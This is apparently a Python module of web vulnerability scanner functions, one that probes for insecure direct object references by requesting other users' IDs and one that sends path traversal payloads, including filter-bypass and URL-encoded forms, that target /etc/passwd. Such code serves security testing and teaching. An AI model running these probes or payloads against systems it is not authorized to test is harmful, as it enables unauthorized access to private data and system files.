
def test_idor(session, base_url, param, authorized_id, test_ids):
    findings = []


    baseline = session.get(base_url, params={param: authorized_id})

    for test_id in test_ids:
        if test_id == authorized_id: continue   
        resp = session.get(base_url, params={param: test_id})

      
        if resp.status_code == 200 and len(resp.text) > 100:
            if resp.text != baseline.text:
                findings.append({
                    'url': base_url, 'parameter': param,
                    'payload': test_id, 'type': 'IDOR',
                    'issue': 'Unauthorized resource accessible', 'severity': 'HIGH'
                })
                print(f"  [VULN] IDOR: Accessed ID={test_id} without authorization!")
    return findings

def test_path_traversal(session, base_url, param):
    
    payloads = [
        "../../etc/passwd",         # Go up 2 directories
        "../../../etc/passwd",       # Go up 3 directories
        "....//....//etc/passwd",    # Bypass simple ../ filters
        "%2e%2e%2fetc%2fpasswd"      # URL-encoded version
    ]
    findings = []
    for payload in payloads:
        resp = session.get(base_url, params={param: payload})
        # "root:" appears at start of /etc/passwd — confirms successful traversal
        if "root:" in resp.text:
            findings.append({
                'url': base_url, 'parameter': param,
                'payload': payload, 'type': 'Path Traversal', 'severity': 'HIGH'
            })
            print(f"  [VULN] Path Traversal with: {payload}")
    return findings